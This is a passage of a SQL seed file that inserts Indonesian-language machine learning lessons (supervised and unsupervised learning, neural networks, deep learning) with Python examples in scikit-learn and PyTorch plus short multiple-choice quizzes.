import pandas as pd
imp = pd.Series(rf.feature_importances_, index=X.columns).sort_values(ascending=False)
print(imp.head(10))

# Gradient boosting (sering menang kompetisi)
import xgboost as xgb
xgbclf = xgb.XGBClassifier(n_estimators=300, max_depth=6, learning_rate=0.05,
                           subsample=0.8, colsample_bytree=0.8,
                           eval_metric="logloss", random_state=42)
xgbclf.fit(X_train, y_train, eval_set=[(X_val, y_val)], early_stopping_rounds=20, verbose=False)
```

### Support Vector Machine
Cari hyperplane dengan margin terbesar antar kelas.

```python
from sklearn.svm import SVC
svm = SVC(kernel="rbf", C=1.0, gamma="scale", probability=True)
svm.fit(X_train_scaled, y_train)
```

### k-Nearest Neighbors
Prediksi berdasarkan mayoritas tetangga terdekat.

```python
from sklearn.neighbors import KNeighborsClassifier
knn = KNeighborsClassifier(n_neighbors=5, weights="distance", n_jobs=-1)
knn.fit(X_train_scaled, y_train)
```

## Algoritma untuk Klasifikasi Multi-class

- **One-vs-Rest**: satu classifier per kelas (default sklearn).
- **Softmax Regression**: generalisasi logistic untuk multi-class.
- **Native multi-class**: RF, Naive Bayes, neural network.

## Metric Evaluasi

### Klasifikasi
```python
from sklearn.metrics import (accuracy_score, precision_score, recall_score,
                             f1_score, roc_auc_score, confusion_matrix,
                             classification_report, roc_curve)

y_pred = clf.predict(X_test)
y_prob = clf.predict_proba(X_test)[:, 1]

print(f"Accuracy:  {accuracy_score(y_test, y_pred):.3f}")
print(f"Precision: {precision_score(y_test, y_pred):.3f}")
print(f"Recall:    {recall_score(y_test, y_pred):.3f}")
print(f"F1:        {f1_score(y_test, y_pred):.3f}")
print(f"AUC-ROC:   {roc_auc_score(y_test, y_prob):.3f}")

print(confusion_matrix(y_test, y_pred))
print(classification_report(y_test, y_pred))
```

```text
Confusion Matrix:
              Pred Neg   Pred Pos
Actual Neg      TN          FP
Actual Pos      FN          TP

Precision = TP / (TP + FP)   → dari yang diprediksi positif, berapa benar
Recall    = TP / (TP + FN)   → dari yang aktual positif, berapa tertangkap
F1        = 2*P*R / (P+R)    → harmonic mean

Pilih metric sesuai bisnis:
- Fraud detection → recall tinggi (jangan lewatkan fraud)
- Spam filter → precision tinggi (jangan blok email sah)
```

### Regresi
```python
from sklearn.metrics import mean_squared_error, mean_absolute_error, r2_score
import numpy as np

y_pred = reg.predict(X_test)
print(f"RMSE: {np.sqrt(mean_squared_error(y_test, y_pred)):.3f}")
print(f"MAE:  {mean_absolute_error(y_test, y_pred):.3f}")
print(f"R²:   {r2_score(y_test, y_pred):.3f}")

# MAPE (mean absolute percentage error)
mape = np.mean(np.abs((y_test - y_pred) / y_test)) * 100
print(f"MAPE: {mape:.1f}%")
```

## Cross-Validation

```python
from sklearn.model_selection import cross_val_score, StratifiedKFold, GridSearchCV

# K-fold cross-validation
cv = StratifiedKFold(n_splits=5, shuffle=True, random_state=42)
scores = cross_val_score(rf, X, y, cv=cv, scoring="f1", n_jobs=-1)
print(f"CV F1: {scores.mean():.3f} ± {scores.std():.3f}")

# Hyperparameter tuning
param_grid = {
    "n_estimators": [100, 200, 500],
    "max_depth": [None, 10, 20],
    "min_samples_leaf": [1, 5, 10],
}
grid = GridSearchCV(rf, param_grid, cv=cv, scoring="f1", n_jobs=-1, verbose=1)
grid.fit(X_train, y_train)
print(f"Best: {grid.best_params_} → {grid.best_score_:.3f}")
```

## Class Imbalance

```python
# Class weight
from sklearn.utils.class_weight import compute_class_weight
cw = compute_class_weight("balanced", classes=np.unique(y), y=y)
weights = dict(zip(np.unique(y), cw))
clf = RandomForestClassifier(class_weight=weights)

# Atau threshold tuning untuk F1
from sklearn.metrics import precision_recall_curve
prec, rec, thr = precision_recall_curve(y_val, y_prob)
f1 = 2 * prec * rec / (prec + rec + 1e-9)
best_thr = thr[f1.argmax()]
y_pred = (y_prob > best_thr).astype(int)
```

## Bias-Variance di Praktik

```text
Diagnosis via learning curve:

Training score tinggi, Val score rendah  → overfitting (high variance)
Training & Val score sama-sama rendah     → underfitting (high bias)

Solusi overfitting:
- Lebih banyak data
- Regularisasi (L1/L2, dropout, max_depth)
- Feature selection
- Ensemble (bagging)

Solusi underfitting:
- Model lebih kompleks
- Feature engineering
- Kurangi regularisasi
```

## Interpretabilitas

```python
import shap
explainer = shap.TreeExplainer(rf)
shap_values = explainer.shap_values(X_test)
shap.summary_plot(shap_values, X_test)

# LIME untuk lokal
from lime.lime_tabular import LimeTabularExplainer
lime = LimeTabularExplainer(X_train.values, feature_names=X.columns, class_names=["no", "yes"])
exp = lime.explain_instance(X_test.iloc[0].values, clf.predict_proba, num_features=5)
```

## Tips & Best Practices

- Mulai dari **baseline sederhana** (logistic regression) sebelum kompleks.
- **Selalu cross-validation** untuk estimasi generalisasi.
- **Pilih metric sesuai konteks bisnis** (bukan accuracy untuk imbalance).
- **Tune hyperparameter** setelah feature engineering, bukan sebaliknya.
- **Ensemble** (XGBoost, LightGBM, CatBoost) sering jadi pemenang tabular.
- **Hindari leakage**: timing split, group split, fit train only.
- Dokumentasikan asumsi dan trade-off (model card).

## Kesimpulan

Supervised learning adalah pondasi ML praktis. Dengan memahami trade-off bias-variance, algoritma klasik (linear, tree, ensemble), dan metric yang sesuai konteks bisnis, Anda dapat membangun model yang tidak hanya akurat di paper, tetapi memberi nilai nyata. Yang membedakan praktisi hebat adalah **kemampuan memilih algoritma sesuai data & masalah, serta mengukur dengan metric yang relevan bisnis**. Selanjutnya: unsupervised learning untuk data tanpa label.



## Studi Kasus: Model Prediksi

Collect data, Preprocessing, Train, Evaluate, Deploy.

## Tips

> Kuasai Python, NumPy, Pandas sebelum ML framework.', '📈', false, '[{"question":"Algoritma yang mempartisi feature space berbasis aturan if-else?","options":["Logistic Regression","Decision Tree","k-Means","PCA"],"answer":1,"explanation":"Decision tree mempartisi feature space dengan aturan if-else, interpretable."},{"question":"Metric terbaik untuk dataset klasifikasi tidak seimbang?","options":["Accuracy","F1-score","Mean squared error","R²"],"answer":1,"explanation":"F1 menggabungkan precision-recall, lebih informatif dari accuracy saat imbalance."},{"question":"Tanda model overfitting pada learning curve?","options":["Train rendah, val rendah","Train tinggi, val rendah","Train & val sama tinggi","Val naik terus"],"answer":1,"explanation":"Train tinggi + val rendah = model hafal training, gagal generalisasi."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('unsupervised-learning', 8, 5, 'Unsupervised Learning', 'unsupervised-learning', 'Clustering, dimensionality reduction, dan anomaly detection.', '# Unsupervised Learning


![Unsupervised Learning](https://sfile.chatglm.cn/images-ppt/25c9e605248f.png)

**Unsupervised learning** menemukan struktur tersembunyi dalam data tanpa label. Tiga tugas utama: **clustering** (kelompok), **dimensionality reduction** (kompresi), dan **anomaly detection** (outlier). Unsupervised berguna saat labeling mahal atau untuk eksplorasi—sering jadi langkah awal sebelum supervised.

![Unsupervised Learning](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Clustering

### k-Means
Partisi data ke K cluster berdasarkan jarak ke centroid. Cepat, scaling baik, tetapi perlu K ditentukan.

```python
from sklearn.cluster import KMeans
from sklearn.metrics import silhouette_score
import numpy as np

# Scaling wajib sebelum clustering
from sklearn.preprocessing import StandardScaler
X_scaled = StandardScaler().fit_transform(X)

# Elbow method untuk pilih K
inertias = []
for k in range(2, 11):
    km = KMeans(n_clusters=k, init="k-means++", n_init=10, random_state=42)
    km.fit(X_scaled)
    inertias.append(km.inertia_)

# Silhouette score (lebih informatif)
silhouettes = []
for k in range(2, 11):
    km = KMeans(n_clusters=k, n_init=10, random_state=42)
    labels = km.fit_predict(X_scaled)
    silhouettes.append(silhouette_score(X_scaled, labels))

best_k = np.argmax(silhouettes) + 2  # range mulai 2
km = KMeans(n_clusters=best_k, n_init=10, random_state=42)
clusters = km.fit_predict(X_scaled)
```

### DBSCAN
Density-based—tidak perlu K, menemukan cluster bentuk arbitrary, mendeteksi noise.

```python
from sklearn.cluster import DBSCAN
dbscan = DBSCAN(eps=0.5, min_samples=5, n_jobs=-1)
clusters = dbscan.fit_predict(X_scaled)
# Cluster -1 = noise/outlier
n_clusters = len(set(clusters)) - (1 if -1 in clusters else 0)
print(f"DBSCAN found {n_clusters} clusters")
```

### Hierarchical Clustering
Membangun dendrogram—tidak perlu K awal, bisa cut tree di berbagai level.

```python
from sklearn.cluster import AgglomerativeClustering
from scipy.cluster.hierarchy import dendrogram, linkage
import matplotlib.pyplot as plt

Z = linkage(X_scaled[:200], method="ward")
plt.figure(figsize=(12, 6))
dendrogram(Z, truncate_mode="level", p=5)
plt.title("Hierarchical Clustering Dendrogram")

agg = AgglomerativeClustering(n_clusters=4, linkage="ward")
clusters = agg.fit_predict(X_scaled)
```

### Gaussian Mixture Model (GMM)
Soft clustering—setiap titik punya probabilitas ke setiap cluster.

```python
from sklearn.mixture import GaussianMixture
gmm = GaussianMixture(n_components=4, covariance_type="full", random_state=42)
gmm.fit(X_scaled)
clusters = gmm.predict(X_scaled)
probs = gmm.predict_proba(X_scaled)  # soft assignment
```

## Dimensionality Reduction

### PCA (Principal Component Analysis)
Linier—cari arah variansi maksimum.

```python
from sklearn.decomposition import PCA
import matplotlib.pyplot as plt

pca = PCA(n_components=0.95, random_state=42)   # retain 95% variance
X_pca = pca.fit_transform(X_scaled)
print(f"Reduced: {X.shape} → {X_pca.shape}")
print(f"Explained variance ratio: {pca.explained_variance_ratio_}")

# Scree plot
plt.plot(np.cumsum(pca.explained_variance_ratio_), marker="o")
plt.xlabel("Number of components"); plt.ylabel("Cumulative variance")

# Visualisasi 2D
plt.figure(figsize=(8, 6))
plt.scatter(X_pca[:, 0], X_pca[:, 1], c=clusters, cmap="viridis", alpha=0.6)
```

### t-SNE & UMAP
Non-linear untuk visualisasi—pertahankan struktur lokal.

```python
from sklearn.manifold import TSNE
import umap  # pip install umap-learn

# t-SNE (lambat untuk data besar)
tsne = TSNE(n_components=2, perplexity=30, random_state=42, init="pca")
X_tsne = tsne.fit_transform(X_scaled[:5000])   # sample untuk kecepatan

# UMAP (lebih cepat & preserve struktur global)
reducer = umap.UMAP(n_components=2, n_neighbors=15, min_dist=0.1, random_state=42)
X_umap = reducer.fit_transform(X_scaled)
```

## Anomaly Detection

```python
from sklearn.ensemble import IsolationForest
from sklearn.svm import OneClassSVM
from sklearn.neighbors import LocalOutlierFactor

# Isolation Forest (populer, cepat, scaling baik)
iso = IsolationForest(n_estimators=100, contamination=0.05, random_state=42, n_jobs=-1)
outlier_pred = iso.fit_predict(X_scaled)  # -1 = outlier, 1 = normal
scores = iso.decision_function(X_scaled)  # lower = more anomalous

# Local Outlier Factor (density-based)
lof = LocalOutlierFactor(n_neighbors=20, contamination=0.05)
outlier_pred = lof.fit_predict(X_scaled)

# One-Class SVM (untuk data kecil)
ocsvm = OneClassSVM(kernel="rbf", nu=0.05, gamma="scale")
outlier_pred = ocsvm.fit_predict(X_scaled)
```

## Association Rules & Market Basket

```python
from mlxtend.frequent_patterns import apriori, association_rules
import pandas as pd

# Data: one-hot basket per transaksi
basket = (df.groupby(["transaction", "product"])["qty"]
            .sum().unstack().fillna(0).gt(0).astype(int))

frequent = apriori(basket, min_support=0.02, use_colnames=True)
rules = association_rules(frequent, metric="lift", min_threshold=1.5)
rules = rules.sort_values("lift", ascending=False).head(10)
print(rules[["antecedents", "consequents", "support", "confidence", "lift"]])
```

## Evaluasi Clustering

```python
from sklearn.metrics import (silhouette_score, davies_bouldin_score,
                             calinski_harabasz_score, adjusted_rand_score)

# Internal metric (tanpa ground truth)
sil = silhouette_score(X_scaled, clusters)         # [-1, 1], higher better
db = davies_bouldin_score(X_scaled, clusters)      # lower better
ch = calinski_harabasz_score(X_scaled, clusters)   # higher better

# External (dengan ground truth, mis. untuk validasi)
ari = adjusted_rand_score(y_true, clusters)        # [-1, 1], 1 = perfect
```

## Use Cases Unsupervised

- **Customer segmentation**: RFM (Recency, Frequency, Monetary) + k-Means.
- **Anomaly detection**: fraud, sensor failure, network intrusion.
- **Recommender**: collaborative filtering via matrix factorization.
- **Topic modeling**: LDA, BERTopic untuk dokumen.
- **Image compression**: PCA/UMAP untuk fitur.
- **Preprocessing**: reduce dimensi sebelum supervised.

```python
# RFM Analysis untuk customer segmentation
import numpy as np
import datetime as dt

snapshot = df["order_date"].max() + dt.timedelta(days=1)
rfm = df.groupby("customer_id").agg({
    "order_date": lambda d: (snapshot - d.max()).days,   # Recency
    "order_id": "count",                                  # Frequency
    "amount": "sum"                                       # Monetary
}).rename(columns={"order_date": "recency", "order_id": "frequency"})

# Log transform + scale
rfm_log = np.log1p(rfm)
rfm_scaled = StandardScaler().fit_transform(rfm_log)

# Cluster
km = KMeans(n_clusters=4, n_init=10, random_state=42)
rfm["segment"] = km.fit_predict(rfm_scaled)
print(rfm.groupby("segment").mean())
```

## Tips & Best Practices

- **Scaling wajib** untuk clustering & PCA (jarak-based).
- Visualisasi 2D (PCA, t-SNE, UMAP) untuk intuisi, bukan klaim formal.
- **Jangan lakukan supervised langsung**—selalu EDA + clustering dulu.
- Untuk data besar, gunakan **MiniBatchKMeans** atau **HDBSCAN**.
- **Anomaly detection** threshold tuning via business trade-off (FP vs FN cost).
- Cluster **interpretability**: profil centroid, beri label bisnis (mis. "high-value churner").

## Kesimpulan

Unsupervised learning membuka wawasan dari data tanpa label. Clustering mengungkap segmen, dimensionality reduction memvisualisasikan & mengompresi, anomaly detection menemukan pencilan. Tantangannya: tidak ada "ground truth" untuk validasi, sehingga evaluasi membutuhkan metrik internal + judgment bisnis. Kombinasi unsupervised + supervised sering menghasilkan pipeline yang lebih kuat dari supervised saja.



## Studi Kasus: Model Prediksi

Collect data, Preprocessing, Train, Evaluate, Deploy.

## Tips

> Kuasai Python, NumPy, Pandas sebelum ML framework.', '🔍', false, '[{"question":"Algoritma clustering yang TIDAK perlu menentukan jumlah cluster awal?","options":["k-Means","DBSCAN","GMM","K-Means++"],"answer":1,"explanation":"DBSCAN berbasis density, menemukan cluster otomatis dan mendeteksi noise."},{"question":"Metrik internal untuk mengevaluasi clustering (higher = better)?","options":["Davies-Bouldin","Inertia","Silhouette score","Within-cluster SSE"],"answer":2,"explanation":"Silhouette score [-1,1], higher = cluster lebih terpisah & kohesif."},{"question":"Teknik dimensionality reduction non-linear untuk visualisasi?","options":["PCA","t-SNE","LDA (supervised)","SVD"],"answer":1,"explanation":"t-SNE (dan UMAP) non-linear, ideal untuk visualisasi struktur lokal."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('neural-networks', 8, 6, 'Neural Networks', 'neural-networks', 'Perceptron, activation function, backpropagation, dan training NN.', '# Neural Networks


![Neural Networks](https://sfile.chatglm.cn/images-ppt/dd77ac8e6c34.jpeg)

**Neural network** adalah model inspirasi biologis yang terdiri dari neuron buatan tersusun dalam lapisan. Setiap neuron menghitung kombinasi linear input + aktivasi non-linear. Dengan lapisan tersembunyi, NN dapat mempelajari fungsi non-linear kompleks—fondasi deep learning. Materi ini mengupas matematika dan implementasi neural network sederhana.

![Neural Networks](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## Anatomi Neuron

Setiap neuron menghitung:

```text
z = w₁x₁ + w₂x₂ + ... + wₙxₙ + b     (linear combination)
a = f(z)                              (activation function)

- x = input feature
- w = weight (parameter yang dipelajari)
- b = bias
- f = fungsi aktivasi non-linear
```

Tanpa aktivasi non-linear, berapapun lapisan tetap ekuivalen dengan satu transformasi linear.

## Fungsi Aktivasi

| Nama | Rumus | Kapan pakai |
|------|-------|-------------|
| **ReLU** | max(0, z) | Default hidden layer |
| **Leaky ReLU** | max(0.01z, z) | Jika ReLU dying |
| **Sigmoid** | 1/(1+e^-z) | Output binary |
| **Tanh** | (e^z - e^-z)/(e^z + e^-z) | Hidden, range [-1,1] |
| **Softmax** | e^zᵢ / Σe^zⱼ | Output multi-class |
| **GELU** | z·Φ(z) | Transformer, modern |

```python
import numpy as np
import matplotlib.pyplot as plt

z = np.linspace(-5, 5, 200)
plt.figure(figsize=(10, 6))
plt.plot(z, np.maximum(0, z), label="ReLU", linewidth=2)
plt.plot(z, 1/(1+np.exp(-z)), label="Sigmoid")
plt.plot(z, np.tanh(z), label="Tanh")
plt.plot(z, np.where(z > 0, z, 0.01*z), label="Leaky ReLU", linestyle="--")
plt.legend(); plt.grid(True); plt.title("Activation Functions")
```

## Arsitektur Multi-Layer Perceptron (MLP)

```text
Input Layer  →  Hidden Layer(s)  →  Output Layer
(x₁,x₂,...,xₙ)   (h₁,...,hₘ)        (ŷ)

Forward pass:
  a⁰ = x                           (input)
  zˡ = Wˡ · a^(l-1) + bˡ          (pre-activation layer l)
  aˡ = f(zˡ)                      (activation layer l)
  ŷ = aᴸ                          (output layer L)
```

## Backpropagation & Gradient Descent

Loss function mengukur kesalahan prediksi. Backpropagation menghitung gradien loss terhadap setiap parameter menggunakan chain rule.

```text
Loss:    L(y, ŷ)
Gradien: ∂L/∂Wˡ, ∂L/∂bˡ via chain rule

Update:
  W ← W - η · ∂L/∂W     (η = learning rate)
  b ← b - η · ∂L/∂b

Variants:
- SGD          : vanilla
- Momentum     : akumulasi gradien (mempercepat konvergensi)
- Adam         : adaptif lr per parameter (paling populer)
- RMSprop      : adaptif, populer untuk RNN
```

## Implementasi dari Nol (NumPy)

```python
import numpy as np

class MLP:
    def __init__(self, in_dim, hid_dim, out_dim, lr=0.01, seed=42):
        rng = np.random.default_rng(seed)
        self.W1 = rng.standard_normal((in_dim, hid_dim)) * np.sqrt(2/in_dim)
        self.b1 = np.zeros(hid_dim)
        self.W2 = rng.standard_normal((hid_dim, out_dim)) * np.sqrt(2/hid_dim)
        self.b2 = np.zeros(out_dim)
        self.lr = lr

    def relu(self, z): return np.maximum(0, z)
    def softmax(self, z):
        e = np.exp(z - z.max(axis=1, keepdims=True))
        return e / e.sum(axis=1, keepdims=True)

    def forward(self, X):
        self.z1 = X @ self.W1 + self.b1
        self.a1 = self.relu(self.z1)
        self.z2 = self.a1 @ self.W2 + self.b2
        return self.softmax(self.z2)

    def backward(self, X, y, probs):
        m = X.shape[0]
        dz2 = (probs - y) / m                  # cross-entropy + softmax gradient
        self.dW2 = self.a1.T @ dz2
        self.db2 = dz2.sum(axis=0)
        da1 = dz2 @ self.W2.T
        dz1 = da1 * (self.z1 > 0)              # ReLU gradient
        self.dW1 = X.T @ dz1
        self.db1 = dz1.sum(axis=0)

    def step(self):
        self.W1 -= self.lr * self.dW1
        self.b1 -= self.lr * self.db1
        self.W2 -= self.lr * self.dW2
        self.b2 -= self.lr * self.db2

# Train loop
nn = MLP(in_dim=784, hid_dim=128, out_dim=10, lr=0.1)
for epoch in range(20):
    probs = nn.forward(X_batch)
    nn.backward(X_batch, y_onehot, probs)
    nn.step()
```

## Implementasi dengan PyTorch

```python
import torch
import torch.nn as nn
import torch.optim as optim
from torch.utils.data import DataLoader, TensorDataset

# Dataset
loader = DataLoader(TensorDataset(torch.FloatTensor(X_train), torch.LongTensor(y_train)),
                    batch_size=64, shuffle=True)

# Model
class MLP(nn.Module):
    def __init__(self, in_dim, hid_dim, out_dim):
        super().__init__()
        self.net = nn.Sequential(
            nn.Linear(in_dim, hid_dim),
            nn.BatchNorm1d(hid_dim),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(hid_dim, hid_dim),
            nn.BatchNorm1d(hid_dim),
            nn.ReLU(),
            nn.Dropout(0.2),
            nn.Linear(hid_dim, out_dim),
        )
    def forward(self, x): return self.net(x)

device = "cuda" if torch.cuda.is_available() else "cpu"
model = MLP(784, 256, 10).to(device)
criterion = nn.CrossEntropyLoss()
optimizer = optim.Adam(model.parameters(), lr=1e-3, weight_decay=1e-5)
scheduler = optim.lr_scheduler.ReduceLROnPlateau(optimizer, patience=3, factor=0.5)

# Training loop
for epoch in range(50):
    model.train()
    total_loss = 0
    for xb, yb in loader:
        xb, yb = xb.to(device), yb.to(device)
        optimizer.zero_grad()
        out = model(xb)
        loss = criterion(out, yb)
        loss.backward()
        optimizer.step()
        total_loss += loss.item() * len(xb)
    scheduler.step(total_loss / len(loader))
    print(f"Epoch {epoch+1}: loss={total_loss/len(loader):.4f}")
```

## Loss Function Umum

| Tugas | Loss | PyTorch |
|-------|------|---------|
| Regresi | MSE | `nn.MSELoss()` |
| Klasifikasi binary | BCE | `nn.BCEWithLogitsLoss()` |
| Klasifikasi multi-class | Cross-entropy | `nn.CrossEntropyLoss()` |
| L1 / Huber | L1, Smooth L1 | `nn.L1Loss()`, `nn.SmoothL1Loss()` |

## Regularisasi

Mencegah overfitting:

- **L2 (weight decay)** — tambah ‖w‖² ke loss.
- **Dropout** — matikan neuron acak saat training (rate 0.1-0.5).
- **Batch Normalization** — normalisasi aktivasi per batch.
- **Layer Norm** — normalisasi per sample (transformer).
- **Early Stopping** — hentikan saat val loss naik.
- **Data Augmentation** — augmentasi data training (image: flip, rotasi, crop).

## Inisialisasi Weight

- **Xavier/Glorot** — untuk tanh/sigmoid: `std = sqrt(2/(fan_in+fan_out))`.
- **He/Kaiming** — untuk ReLU: `std = sqrt(2/fan_in)` (default PyTorch Linear).
- Hindari inisialisasi nol (simetri tidak pecah) atau konstan besar (gradien meledak/hilang).

## Tips & Best Practices

- Mulai dengan **architectur sederhana** (1-2 hidden layer) sebelum tambah kompleksitas.
- **Scale input** (StandardScaler) — neural network sensitif terhadap skala.
- **Monitor training vs validation loss** untuk deteksi overfit/underfit.
- **Learning rate scheduler** (ReduceLROnPlateau, CosineAnnealing) membantu konvergensi.
- **Mixed precision** (fp16) untuk training lebih cepat di GPU modern.
- **Reproducibility**: set seed, `torch.use_deterministic_algorithms(True)`.
- **Track eksperimen** dengan MLflow/W&B untuk eksperimen terkontrol.

## Kesimpulan

Neural network memodelkan fungsi kompleks melalui kombinasi linear + aktivasi non-linear. Memahami forward pass, backpropagation, dan elemen regularisasi (dropout, batchnorm, weight decay) adalah keterampilan fondasi sebelum melangkah ke arsitektur khusus (CNN, RNN, Transformer). Implementasi dari nol sekali mengajarkan intuisi; setelahnya, pakai framework (PyTorch/TensorFlow) untuk produktivitas. Yang membedakan praktisi hebat adalah **kemampuan diagnosis training** (loss curve, gradient flow) bukan sekadar memanggil API.



## Studi Kasus: Model Prediksi

Collect data, Preprocessing, Train, Evaluate, Deploy.

## Tips

> Kuasai Python, NumPy, Pandas sebelum ML framework.', '🧠', false, '[{"question":"Mengapa neural network butuh fungsi aktivasi non-linear?","options":["Mempercepat training","Agar bisa belajar fungsi non-linear","Mengurangi parameter","Menghindari overfitting"],"answer":1,"explanation":"Tanpa non-linear, stack lapisan linear tetap ekuivalen linear—tak bisa model non-linear."},{"question":"Fungsi aktivasi default untuk hidden layer modern?","options":["Sigmoid","Tanh","ReLU","Softmax"],"answer":2,"explanation":"ReLU (max(0,z)) adalah default hidden layer—cepat, tidak saturate positif."},{"question":"Algoritma optimisasi paling populer untuk training NN?","options":["SGD murni","Adam","Newton method","Coordinate descent"],"answer":1,"explanation":"Adam adaptif per-parameter, populer untuk mayoritas workload deep learning."}]', NOW(), NOW());
INSERT INTO "Material" (id, level, "order", title, slug, description, content, icon, "isProject", quiz, "createdAt", "updatedAt") VALUES ('deep-learning', 8, 7, 'Deep Learning', 'deep-learning', 'CNN, RNN, Transformer, dan framework deep learning modern.', '# Deep Learning


![Deep Learning](https://sfile.chatglm.cn/images-ppt/25c9e605248f.png)

**Deep learning** adalah sub-bidang ML berbasis neural network dengan banyak lapisan. Berkat GPU, dataset besar, dan arsitektur khusus (CNN, RNN, Transformer), deep learning mencapai performa super-human pada banyak tugas: image classification, speech recognition, terjemahan, hingga protein folding. Materi ini mengupas arsitektur utama dan framework modern.

![Deep Learning](https://sfile.chatglm.cn/images-ppt/2ccd2dc8282b.png)

## CNN (Convolutional Neural Network)

Spesialisasi untuk data grid (gambar, audio spectrogram). Tiga konsep inti:

- **Convolution** — filter belajar pola lokal (edge, tekstur, objek).
- **Pooling** — downsampling, invarian translasi.
- **Hierarchical features** — lapisan awal belajar edge, lapisan dalam belajar objek.

```python
import torch
import torch.nn as nn

class CNN(nn.Module):
    def __init__(self, num_classes=10):
        super().__init__()
        self.features = nn.Sequential(
            nn.Conv2d(3, 32, kernel_size=3, padding=1),
            nn.BatchNorm2d(32), nn.ReLU(),
            nn.Conv2d(32, 32, 3, padding=1), nn.ReLU(),
            nn.MaxPool2d(2),                       # 32x32 → 16x16

            nn.Conv2d(32, 64, 3, padding=1),
            nn.BatchNorm2d(64), nn.ReLU(),
            nn.Conv2d(64, 64, 3, padding=1), nn.ReLU(),
            nn.MaxPool2d(2),                       # 16x16 → 8x8
        )
        self.classifier = nn.Sequential(
            nn.AdaptiveAvgPool2d(1),
            nn.Flatten(),
            nn.Dropout(0.5),
            nn.Linear(64, num_classes),
        )
    def forward(self, x):
        return self.classifier(self.features(x))

# Transfer learning dengan ResNet pre-trained
from torchvision import models
model = models.resnet50(weights=models.ResNet50_Weights.IMAGENET1K_V2)
model.fc = nn.Linear(model.fc.in_features, num_classes)  # replace head
for p in model.parameters(): p.requires_grad = False     # freeze backbone
for p in model.fc.parameters(): p.requires_grad = True   # train head only
```

## RNN & LSTM untuk Sequence

RNN memproses sequence dengan hidden state yang beruntun. LSTM/GRU mengatasi vanishing gradient.

```python
class TextClassifier(nn.Module):
    def __init__(self, vocab_size, emb_dim=128, hid_dim=256, num_classes=5):
        super().__init__()
        self.emb = nn.Embedding(vocab_size, emb_dim, padding_idx=0)
        self.lstm = nn.LSTM(emb_dim, hid_dim, batch_first=True,
                            bidirectional=True, num_layers=2, dropout=0.3)
        self.fc = nn.Linear(hid_dim * 2, num_classes)   # *2 for bidirectional

    def forward(self, x):
        emb = self.emb(x)                  # (B, T, E)
        out, (h, c) = self.lstm(emb)       # (B, T, 2H), (2, B, H)
        h = torch.cat([h[-2], h[-1]], dim=1)   # last hidden both directions
        return self.fc(h)
```

## Transformer & Attention

Transformer (Vaswani et al. 2017) mengganti rekurens dengan **self-attention**—paralel, scaling baik. Fondasi LLM modern (GPT, BERT, Llama).

```text
Self-Attention:
  Q = X · W_Q    (query)
  K = X · W_K    (key)
  V = X · W_V    (value)
  Attention(Q,K,V) = softmax(Q·K^T / sqrt(d_k)) · V

Multi-head: jalankan beberapa attention paralel, concat, proyeksi.
Positional encoding: tambahkan info posisi (sinusoidal atau learned).
```

```python
import torch.nn.functional as F

class SelfAttention(nn.Module):
    def __init__(self, dim, heads=8):
        super().__init__()
        self.heads = heads
        self.scale = (dim // heads) ** -0.5
        self.to_qkv = nn.Linear(dim, dim * 3, bias=False)
        self.to_out = nn.Linear(dim, dim)

    def forward(self, x, mask=None):
        B, T, D = x.shape
        qkv = self.to_qkv(x).chunk(3, dim=-1)
        q, k, v = map(lambda t: t.reshape(B, T, self.heads, D//self.heads).transpose(1,2), qkv)
        attn = (q @ k.transpose(-2,-1)) * self.scale    # (B, H, T, T)
        if mask is not None:
            attn = attn.masked_fill(mask == 0, float(''-inf''))
        attn = F.softmax(attn, dim=-1)
        out = (attn @ v).transpose(1,2).reshape(B, T, D)
        return self.to_out(out)

# Pakai nn.TransformerEncoderLayer untuk implementasi siap pakai
encoder_layer = nn.TransformerEncoderLayer(
    d_model=512, nhead=8, dim_feedforward=2048,
    dropout=0.1, batch_first=True, activation="gelu"
)
transformer = nn.TransformerEncoder(encoder_layer, num_layers=6)
```

## Pre-trained Models & Hugging Face

```python
from transformers import AutoTokenizer, AutoModelForSequenceClassification, pipeline

# Sentiment analysis dengan model pre-trained
classifier = pipeline("sentiment-analysis", model="distilbert-base-uncased-finetuned-sst-2-english")
results = classifier(["I love this!", "This is terrible."])

# Fine-tuning BERT
tokenizer = AutoTokenizer.from_pretrained("bert-base-uncased")
model = AutoModelForSequenceClassification.from_pretrained("bert-base-uncased", num_labels=5)

encodings = tokenizer(texts, padding=True, truncation=True, max_length=128, return_tensors="pt")
outputs = model(**encodings, labels=labels)
loss = outputs.loss
```

## Image Generation (Diffusion)

```python
from diffusers import StableDiffusionPipeline
import torch

pipe = StableDiffusionPipeline.from_pretrained(
    "runwayml/stable-diffusion-v1-5", torch_dtype=torch.float16
).to("cuda")

image = pipe("a futuristic city at sunset, cyberpunk style, highly detailed",
             num_inference_steps=30, guidance_scale=7.5).images[0]
image.save("city.png")
```

## Framework Deep Learning

| Framework | Developer | Karakteristik |
|-----------|-----------|---------------|
| **PyTorch** | Meta | Dynamic graph, Pythonic, riset dominan |
| **TensorFlow / Keras** | Google | Production, TFLite untuk mobile |
| **JAX** | Google | Functional, autodiff, XLA, riset modern |
| **MXNet** | Apache | AWS, semakin kurang populer |

PyTorch mendominasi riset; TensorFlow/Keras kuat di production & mobile. JAX naik daun untuk model besar.

## Training Best Practices

```python
# Mixed precision training (fp16) - 2x lebih cepat
from torch.cuda.amp import autocast, GradScaler
scaler = GradScaler()

for xb, yb in loader:
    optimizer.zero_grad()
    with autocast():
        out = model(xb)
        loss = criterion(out, yb)
    scaler.scale(loss).backward()
    scaler.step(optimizer)
    scaler.update()

# Distributed training
import torch.distributed as dist
dist.init_process_group("nccl")
model = nn.parallel.DistributedDataParallel(model, device_ids=[local_rank])

# Gradient clipping (anti exploding gradient)
torch.nn.utils.clip_grad_norm_(model.parameters(), max_norm=1.0)
```

## Tips & Best Practices

- **Transfer learning** — mulai dari model pre-trained (ImageNet, HuggingFace) untuk dataset kecil.
- **Data augmentation** — flip, rotasi, crop, color jitter untuk image; synonym swap untuk text.
- **Learning rate warmup** — mulai lr kecil, naikkan, lalu decay (cosine).
- **Batch size besar** = gradien lebih halus, tetapi butuh lr besar + warmup.
- **Label smoothing** — anti over-confidence, meningkatkan kalibrasi.
